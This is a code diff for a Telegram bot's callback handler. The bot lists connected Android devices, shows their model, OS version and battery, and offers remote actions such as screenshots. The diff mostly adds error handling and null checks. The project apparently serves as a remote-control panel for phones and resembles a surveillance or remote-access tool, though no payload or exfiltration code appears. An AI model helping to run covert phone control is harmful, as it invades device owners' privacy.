@@ -1085,7 +1085,10 @@ async function handleTelegramCallback(callbackQuery) {
 
     console.log(`📨 Callback received: ${data}`);
 
-    await answerCallbackQuery(callbackId);
+    // Always answer callback query immediately to prevent timeout
+    await answerCallbackQuery(callbackId).catch(e => 
+        console.error('Error answering callback:', e)
+    );
 
     try {
         // Main menu navigation
@@ -1096,8 +1099,10 @@ async function handleTelegramCallback(callbackQuery) {
             );
         }
         else if (data === 'menu_devices') {
-            await showDevicesMenu(chatId, messageId);
+            // Pass the callbackQuery object to the function
+            await showDevicesMenu(chatId, messageId, callbackQuery);
         }
+
         else if (data === 'menu_screenshot') {
             await showScreenshotMenu(chatId, messageId);
         }
@@ -1123,10 +1128,11 @@ async function handleTelegramCallback(callbackQuery) {
             await showHelpMenu(chatId, messageId);
         }
         // Device actions
-        else if (data.startsWith('device_')) {
-            const deviceId = data.substring(7);
-            await showDeviceDetails(chatId, messageId, deviceId);
-        }
+else if (data.startsWith('device_')) {
+    const deviceId = data.substring(7);
+    await showDeviceDetails(chatId, messageId, deviceId, callbackQuery);
+}
+
         else if (data.startsWith('screenshot_')) {
             const deviceId = data.substring(11);
             await takeScreenshot(chatId, messageId, deviceId);
@@ -1243,12 +1249,13 @@ async function handleTelegramCallback(callbackQuery) {
             const deviceId = data.substring(5);
             await getDeviceInfo(chatId, messageId, deviceId);
         }
-    } catch (error) {
+        } catch (error) {
         console.error('Error in callback handler:', error);
+        // Don't try to edit message if it failed, just send a new one
         await sendTelegramMessage(chatId, 
             '⚠️ *Session Expired*\n\nPlease use /start to restart the menu.',
             { reply_markup: { inline_keyboard: MainMenuKeyboard } }
-        );
+        ).catch(e => console.error('Error sending fallback message:', e));
     }
 }
 
@@ -1256,11 +1263,11 @@ async function handleTelegramCallback(callbackQuery) {
 // MENU DISPLAY FUNCTIONS
 // ============================================
 
-async function showDevicesMenu(chatId, messageId) {
-    db.all('SELECT * FROM devices WHERE is_active = 1 ORDER BY last_seen DESC', [], (err, devices) => {
+async function showDevicesMenu(chatId, messageId, callbackQuery = null) {
+    db.all('SELECT * FROM devices WHERE is_active = 1 ORDER BY last_seen DESC', [], async (err, devices) => {
         if (err) {
             console.error('Error fetching devices:', err);
-            editMessageText(chatId, messageId, '❌ Error fetching devices');
+            await editMessageText(chatId, messageId, '❌ Error fetching devices');
             return;
         }
 
@@ -1269,37 +1276,48 @@ async function showDevicesMenu(chatId, messageId) {
             const keyboard = [[{ text: '🔄 REFRESH', callback_data: 'menu_devices' }, 
                                { text: '🔙 MAIN MENU', callback_data: 'menu_main' }]];
             
-            // Check if the message content would be the same
-            if (callbackQuery && callbackQuery.message.text === text) {
+            // Check if callbackQuery exists before accessing its properties
+            if (callbackQuery && callbackQuery.message && callbackQuery.message.text === text) {
                 // Just answer the callback query without editing
-                answerCallbackQuery(callbackId, 'No devices connected');
+                if (callbackQuery.id) {
+                    await answerCallbackQuery(callbackQuery.id, 'No devices connected');
+                }
                 return;
             }
             
-            editMessageText(chatId, messageId, text, keyboard);
+            await editMessageText(chatId, messageId, text, keyboard);
             return;
         }
 
         const text = `📱 *Connected Devices (${devices.length})*\n\nSelect a device to control:`;
         const keyboard = DevicesMenuKeyboard(devices);
         
-        // Check if the message content would be the same
-        if (callbackQuery && callbackQuery.message.text === text) {
-            answerCallbackQuery(callbackId, 'Devices list refreshed');
+        // Check if callbackQuery exists before accessing its properties
+        if (callbackQuery && callbackQuery.message && callbackQuery.message.text === text) {
+            if (callbackQuery.id) {
+                await answerCallbackQuery(callbackQuery.id, 'Devices list refreshed');
+            }
             return;
         }
         
-        editMessageText(chatId, messageId, text, keyboard);
+        await editMessageText(chatId, messageId, text, keyboard);
     });
 }
 
-async function showDeviceDetails(chatId, messageId, deviceId) {
-    db.get('SELECT * FROM devices WHERE id = ?', [deviceId], (err, device) => {
+async function showDeviceDetails(chatId, messageId, deviceId, callbackQuery = null) {
+    db.get('SELECT * FROM devices WHERE id = ?', [deviceId], async (err, device) => {
         if (err || !device) {
-            editMessageText(chatId, messageId,
-                '❌ *Device Not Found*\n\nThe device may have disconnected.',
-                [[{ text: '🔙 BACK TO DEVICES', callback_data: 'menu_devices' }]]
-            );
+            const text = '❌ *Device Not Found*\n\nThe device may have disconnected.';
+            const keyboard = [[{ text: '🔙 BACK TO DEVICES', callback_data: 'menu_devices' }]];
+            
+            if (callbackQuery && callbackQuery.message && callbackQuery.message.text === text) {
+                if (callbackQuery.id) {
+                    await answerCallbackQuery(callbackQuery.id, 'Device not found');
+                }
+                return;
+            }
+            
+            await editMessageText(chatId, messageId, text, keyboard);
             return;
         }
 
@@ -1307,7 +1325,7 @@ async function showDeviceDetails(chatId, messageId, deviceId) {
         const uptime = formatUptime(device.registered_at);
         const batteryEmoji = getBatteryEmoji(device.battery_level);
 
-        const message = 
+        const text = 
             `📱 *Device Details*\n\n` +
             `*Model:* ${device.model || 'Unknown'}\n` +
             `*Android:* ${device.android_version || 'Unknown'}\n` +
@@ -1318,7 +1336,16 @@ async function showDeviceDetails(chatId, messageId, deviceId) {
             `*Features:* ${device.features ? JSON.parse(device.features).join(', ') : 'Standard'}\n\n` +
             `*Select an action:*`;
 
-        editMessageText(chatId, messageId, message, DeviceActionKeyboard(deviceId));
+        const keyboard = DeviceActionKeyboard(deviceId);
+        
+        if (callbackQuery && callbackQuery.message && callbackQuery.message.text === text) {
+            if (callbackQuery.id) {
+                await answerCallbackQuery(callbackQuery.id, 'Device details refreshed');
+            }
+            return;
+        }
+        
+        await editMessageText(chatId, messageId, text, keyboard);
     });
 }
 
